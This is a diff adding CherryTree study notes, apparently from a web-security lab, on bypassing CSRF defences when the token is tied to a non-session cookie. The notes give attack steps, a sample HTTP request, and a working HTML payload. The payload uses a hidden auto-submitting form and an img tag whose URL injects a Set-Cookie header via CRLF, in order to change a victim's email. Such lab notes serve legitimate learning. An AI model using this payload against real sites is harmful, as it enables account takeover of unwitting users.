@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="42" master_id="0" name="4." prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747575683" ts_lastsave="1747586879">
+    <rich_text>Extra header which ties csfr token to a cookie but not necassarily the session cookie
+and email change ist dependend on csfr token.
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Hard to exploit but possible
+You need to be able to set a session cookie in victim broswer f,e, xss
+
+   1) you log in with your account and get csfr token + session cookie
+   2) set session cookie in victim browser
+   3) You set the header with your session and csfr key.
+   4) feed actual victim token to change email.
+
+Sidenote, cookies have often a scope for an entire DNS zone all subdomains etc, and its viable anywhere to set / cahnge it.
+
+Attack:
+1, See if the CSFR token is tied to the CSFR cookie
+	- submit invalid CSFR token.
+			</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+	- submit a valid CSFR from a DIFFERET user.
+			Important -&gt; use a different browser or incognito
+			</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+			</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+2. Submit valid CSRF token and CSFR cookie (attacker) and a different session cookie(victim).
+		Grabbing the csfrKey( under cookiescookie): 
+		</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+		attacker: CSFR-token: RnGR8OFyDtnJIIdhsHA5UWunvJqsJ4OE
+					   CSFRKEY-(session): dlas0qWnJekQLfc26D9graV10QqMIkXp
+		
+		So we can change the email of a user cause its bound to session -cookie by using our 2 CFSRs
+			</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+			
+			
+Now what we need to be able to do:
+	1. Inject a csfrKey cookie in the user's session (HTTP Header injection)
+	2.  Send a CSFR attack to the victim with a known csfr token.
+	
+Find a vulnerability for a http-header injection:
+	The last searched item goes into the cookies.
+	
+	Write a payload:
+					new is the http header rinjection, rest is basically same liek all others.
+		
+
+</rich_text>
+    <codebox char_offset="133" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">POST /email/change HTTP/1.1&#13;
+Host: vulnerable-website.com&#13;
+Content-Type: application/x-www-form-urlencoded&#13;
+Content-Length: 68&#13;
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv&#13;
+&#13;
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com</codebox>
+    <encoded_png char_offset="675" justification="left" link="" sha256sum="7d388c3cf44f48efda1fa831686d4df463ab913138b9e4cb8d2d886040831467"/>
+    <encoded_png char_offset="778" justification="left" link="" sha256sum="26a60a8fcbb23b39487ebf8ecdf3be28fb9ffab2139cefb24e60d7310c01679b"/>
+    <encoded_png char_offset="783" justification="left" link="" sha256sum="171c4488b22cb049f899652d83a53216061207db8edbfad516d99e0c04010b65"/>
+    <encoded_png char_offset="928" justification="left" link="" sha256sum="d85e85f1292c374e971de1d532f33505fa92da88b399eb89b72e29bb4f0086f0"/>
+    <encoded_png char_offset="1148" justification="left" link="" sha256sum="e1b214cc9838bc4ec64cbfe92b62b49836c9b2a475c1e4180516043cd9671dc5"/>
+    <encoded_png char_offset="1430" justification="left" link="" sha256sum="56d0ff62ffccbffb654dfc97d61b9ed1603d5b4009f0fbe96ef894e6de2ace89"/>
+    <codebox char_offset="1532" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">    &lt;iframe style="display: none" name="csrf-iframe"&gt;&lt;/iframe&gt;&#13;
+    &lt;form action="https://0a09002204ff536c800e6779009a0032.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe"&gt;&#13;
+        &lt;input type="hidden" name="email" value="testtest@value.at"&gt;&#13;
+        &lt;input type="hidden" name="csrf" value="RnGR8OFyDtnJIIdhsHA5UWunvJqsJ4OE"&gt;&#13;
+    &lt;/form&gt;&#13;
+    &lt;img src="https://0a09002204ff536c800e6779009a0032.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=dlas0qWnJekQLfc26D9graV10QqMIkXp%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;</codebox>
+  </node>
+</cherrytree>
